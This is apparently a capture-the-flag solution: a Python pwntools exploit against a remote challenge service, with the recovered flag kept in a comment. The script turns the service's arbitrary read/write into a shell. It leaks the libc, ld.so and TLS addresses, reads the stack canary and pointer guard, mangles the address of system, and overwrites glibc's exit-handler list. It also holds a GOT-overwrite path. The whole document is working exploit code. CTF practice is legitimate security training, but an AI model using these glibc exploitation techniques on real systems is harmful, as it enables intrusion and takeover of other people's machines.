#!/usr/bin/env python3
import struct

from pwn import *
def main():
    prompt = b"\n> "
    # with process(["./sp33d3"]) as tube:
    with remote("sp33d.play.hfsc.tf", 16522) as tube:

        def arb_read(addr, size):
            tube.sendlineafter(prompt, b"3")
            tube.sendlineafter(b"addr: ", hex(addr).encode())
            tube.sendlineafter(b"count: ", str(size).encode())
            return tube.recvn(size)

        def arb_write(addr, data):
            tube.sendlineafter(prompt, b"4")
            tube.sendlineafter(b"addr: ", hex(addr).encode())
            tube.sendlineafter(b"count: ", str(len(data)).encode())
            tube.send(data)

        tube.sendlineafter(prompt, b"1")
        tube.sendlineafter(b"size: ", b"10000000")
        ptr = int(tube.readline(), 16)
        print(hex(ptr))
        libc = ptr + 0x98cff0
        print(hex(libc))
        assert libc & 0xfff == 0
        system = libc + 0x58750
        libc_end = libc + 0x205000
        if not "Full RELRO":
            stdin = libc + 0x202f40
            print(hex(stdin))
            stdin_pie, = struct.unpack("<Q", arb_read(stdin, 8))
            pie = stdin_pie - 0x5020
            print(hex(pie))
            assert pie & 0xfff == 0
            free_got = pie + 0x4F78
            arb_write(free_got, struct.pack("<Q", system))
            arb_write(ptr, b"/bin/sh\0")
            tube.sendlineafter(prompt, b"2")
            tube.sendlineafter(b"addr: ", hex(ptr).encode())

        dl_signal_error, = struct.unpack("<Q", arb_read(libc + 0x202c70, 8))
        ldso = dl_signal_error - 0x1250
        print(hex(ldso))
        assert ldso & 0xfff == 0

        dlfo_nodelete_mappings, = struct.unpack("<Q", arb_read(ldso + 0x363a0, 8))
        fs_base = dlfo_nodelete_mappings - 0xaa0
        print(hex(fs_base))
        if fs_base & 0xfff != 0x740:
            tube.interactive()
        raw = arb_read(fs_base + 0x28, 16)
        stack_cookie, pointer_guard = struct.unpack("<QQ", raw)
        print(hex(stack_cookie))
        print(hex(pointer_guard))
        assert stack_cookie & 0xff == 0
        assert pointer_guard != 0

        def ptr_mangle(addr):
            addr ^= pointer_guard
            addr = ((addr << 17) & ((1 << 64) - 1)) | (addr >> 47)
            return addr

        arb_write(
            libc + 0x203680,  # _exit_funcs
            struct.pack("<Q", ptr)
        )
        arb_write(
            ptr,
            struct.pack(
                "<QQQQQQ",
                0,  # exit_function_list.next
                1,  # exit_function_list.idx
                4,  # exit_function_list.fns[0].cxa.flavor = EF_CXA
                ptr_mangle(system),  # exit_function_list.fns[0].cxa.fn
                ptr + 0x30,  # exit_function_list.fns[0].cxa.arg
                0,  # exit_function_list.fns[0].cxa.dso_handle
            ) + b"/bin/sh\0",
        )

        tube.sendlineafter(prompt, b"5")
        # midnight{b5801f0f154111883817e98e46321c25}

        tube.interactive()

if __name__ == "__main__":
    main()
